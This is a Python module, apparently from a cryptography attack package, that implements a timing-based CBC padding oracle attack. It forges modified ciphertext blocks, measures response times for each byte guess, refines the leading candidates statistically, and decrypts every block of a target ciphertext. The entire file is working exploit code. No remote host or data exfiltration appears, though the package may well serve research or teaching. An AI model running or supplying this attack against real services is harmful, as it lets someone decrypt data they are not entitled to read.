from dataclasses import dataclass
import math

from .. import crypto
from .common import AttackError, TimingOracle

_ADAPTIVE_REFINE_ROUNDS = 6
_CONFIDENCE_Z = 2.5


@dataclass
class TimingConfig:
    initial_samples: int = 1
    refine_samples: int = 4
    top_candidates: int = 6

    def normalized(self) -> "TimingConfig":
        return TimingConfig(
            initial_samples=max(1, int(self.initial_samples)),
            refine_samples=max(1, int(self.refine_samples)),
            top_candidates=min(256, max(1, int(self.top_candidates))),
        )


@dataclass
class Score:
    guess: int
    total: int
    total_sq: int
    samples: int
    forged: bytes

    def avg(self) -> float:
        return self.total / self.samples

    def variance(self) -> float:
        if self.samples < 2:
            return 0.0
        mean = self.avg()
        var = (self.total_sq / self.samples) - (mean * mean)
        if var <= 0:
            return 0.0
        return var


def recover_block_timing(
    prev: bytes,
    curr: bytes,
    oracle: TimingOracle,
    config: TimingConfig,
    prefix: bytes = b"",
) -> tuple[bytes, int]:
    cfg = config.normalized()
    if len(prev) != crypto.BLOCK_SIZE or len(curr) != crypto.BLOCK_SIZE:
        raise AttackError("recover_block_timing requires two 16-byte blocks")
    if len(prefix) % crypto.BLOCK_SIZE != 0:
        raise AttackError("prefix must be a multiple of 16 bytes")

    intermediate = bytearray(crypto.BLOCK_SIZE)
    plaintext = bytearray(crypto.BLOCK_SIZE)
    queries = 0
    prefix_bytes = bytes(prefix)

    for pos in range(crypto.BLOCK_SIZE - 1, -1, -1):
        pad = crypto.BLOCK_SIZE - pos
        base = bytearray(prev)
        for j in range(crypto.BLOCK_SIZE - 1, pos, -1):
            base[j] = intermediate[j] ^ pad

        scores: list[Score] = []
        for guess in range(256):
            candidate_prev = bytearray(base)
            candidate_prev[pos] = guess
            forged = prefix_bytes + bytes(candidate_prev) + curr

            total, total_sq = _sample_stats_ns(oracle, forged, cfg.initial_samples)
            queries += cfg.initial_samples
            scores.append(
                Score(
                    guess=guess,
                    total=total,
                    total_sq=total_sq,
                    samples=cfg.initial_samples,
                    forged=forged,
                )
            )

        scores.sort(key=lambda s: s.avg(), reverse=True)
        limit = min(cfg.top_candidates, len(scores))

        for i in range(limit):
            extra, extra_sq = _sample_stats_ns(oracle, scores[i].forged, cfg.refine_samples)
            queries += cfg.refine_samples
            scores[i].total += extra
            scores[i].total_sq += extra_sq
            scores[i].samples += cfg.refine_samples

        for _ in range(_ADAPTIVE_REFINE_ROUNDS):
            scores.sort(key=lambda s: s.avg(), reverse=True)
            ranked = scores[:limit]
            if len(ranked) < 2:
                break
            if _is_confident(ranked[0], ranked[1]):
                break
            for candidate in ranked:
                extra, extra_sq = _sample_stats_ns(oracle, candidate.forged, cfg.refine_samples)
                queries += cfg.refine_samples
                candidate.total += extra
                candidate.total_sq += extra_sq
                candidate.samples += cfg.refine_samples

        scores.sort(key=lambda s: s.avg(), reverse=True)
        ranked = scores[:limit]
        best_guess = ranked[0].guess

        # For the first recovered byte (pad=1), there can be two valid-padding
        # candidates when the target plaintext block is already full padding
        # (e.g. 0x10 * 16). Probe by flipping the previous byte: valid pad=1
        # survives, while full-block padding usually collapses.
        if pos == crypto.BLOCK_SIZE - 1 and len(ranked) > 1:
            best_guess, extra_queries = _resolve_last_byte_ambiguity(
                ranked,
                oracle,
                prefix_len=len(prefix_bytes),
                probe_samples=cfg.refine_samples,
            )
            queries += extra_queries

        intermediate[pos] = best_guess ^ pad
        plaintext[pos] = intermediate[pos] ^ prev[pos]

    return bytes(plaintext), queries


def recover_ciphertext_block_timing(
    ciphertext: bytes,
    block_index: int,
    oracle: TimingOracle,
    config: TimingConfig,
) -> tuple[bytes, int]:
    if len(ciphertext) < 2 * crypto.BLOCK_SIZE or len(ciphertext) % crypto.BLOCK_SIZE != 0:
        raise AttackError("ciphertext must include IV and be a multiple of 16 bytes")

    num_blocks = len(ciphertext) // crypto.BLOCK_SIZE
    if block_index < 1 or block_index >= num_blocks:
        raise AttackError(f"block index {block_index} out of range")

    prev_start = (block_index - 1) * crypto.BLOCK_SIZE
    prev_end = block_index * crypto.BLOCK_SIZE
    curr_end = (block_index + 1) * crypto.BLOCK_SIZE

    prefix = ciphertext[:prev_start]
    prev = ciphertext[prev_start:prev_end]
    curr = ciphertext[prev_end:curr_end]
    return recover_block_timing(prev, curr, oracle, config, prefix=prefix)


def recover_plaintext_timing(
    ciphertext: bytes,
    oracle: TimingOracle,
    config: TimingConfig,
) -> tuple[bytes, int]:
    if len(ciphertext) < 2 * crypto.BLOCK_SIZE or len(ciphertext) % crypto.BLOCK_SIZE != 0:
        raise AttackError("ciphertext must include IV and be a multiple of 16 bytes")

    num_blocks = len(ciphertext) // crypto.BLOCK_SIZE
    # Hard-coded traversal: recover from last ciphertext block to first.
    indices = range(num_blocks - 1, 0, -1)

    recovered_blocks: dict[int, bytes] = {}
    total_queries = 0

    for block_index in indices:
        block, queries = recover_ciphertext_block_timing(
            ciphertext,
            block_index,
            oracle,
            config,
        )
        recovered_blocks[block_index] = block
        total_queries += queries

    out = bytearray()
    for block_index in range(1, num_blocks):
        out.extend(recovered_blocks[block_index])
    return bytes(out), total_queries


def _sample_duration_ns(oracle: TimingOracle, ciphertext: bytes, samples: int) -> int:
    total, _ = _sample_stats_ns(oracle, ciphertext, samples)
    return total


def _sample_stats_ns(oracle: TimingOracle, ciphertext: bytes, samples: int) -> tuple[int, int]:
    total = 0
    total_sq = 0
    for _ in range(samples):
        value = int(oracle(ciphertext))
        total += value
        total_sq += value * value
    return total, total_sq


def _is_confident(best: Score, second: Score) -> bool:
    gap = best.avg() - second.avg()
    if gap <= 0:
        return False

    se = math.sqrt((best.variance() / best.samples) + (second.variance() / second.samples))
    if se <= 0:
        return True
    return gap > (_CONFIDENCE_Z * se)


def _resolve_last_byte_ambiguity(
    candidates: list[Score],
    oracle: TimingOracle,
    prefix_len: int,
    probe_samples: int,
) -> tuple[int, int]:
    probe_pos = prefix_len + crypto.BLOCK_SIZE - 2
    best_guess = candidates[0].guess
    best_probe_avg = float("-inf")
    queries = 0

    for candidate in candidates:
        probe = bytearray(candidate.forged)
        probe[probe_pos] ^= 0x01
        total = _sample_duration_ns(oracle, bytes(probe), probe_samples)
        queries += probe_samples
        avg = total / probe_samples
        if avg > best_probe_avg:
            best_probe_avg = avg
            best_guess = candidate.guess

    return best_guess, queries
